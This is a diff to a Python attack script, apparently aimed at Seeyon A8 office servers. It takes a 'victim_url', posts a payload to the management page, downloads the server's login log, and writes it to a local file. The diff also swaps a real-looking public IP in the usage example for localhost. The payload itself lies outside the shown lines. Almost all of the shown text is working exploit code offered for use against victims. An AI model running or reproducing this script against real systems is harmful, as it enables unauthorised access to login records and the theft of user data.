@@ -1,4 +1,5 @@
 #encoding:UTF-8
+#!/usr/bin/python
 #version1.1
 import requests
 from bs4 import BeautifulSoup
@@ -8,7 +9,7 @@ import sys
 
 def usage():
     print("usage：.\seeyon.py <victim_url>")
-    print("example：.\seeyon.py http://119.10.114.32")
+    print("example：.\seeyon.py http://127.0.0.1")
     sys.exit(0)
     
 def main():
@@ -29,15 +30,15 @@ def main():
 
         c1 = c.post(url + "/seeyon/management/index.jsp",payload)
         if str(c1) == "<Response [200]>":
-            print("good")
+            print("200")
             c2 = c.get(url + "/seeyon/logs/login.log")
-            print(c2.text)
+            #print(c2.text)
 
             f = open("A8_logs.txt","w")
             f.write(c2.text)
             f.close()
         else:
-            print("QQ")
+            print("404")
     except:
         usage()
 
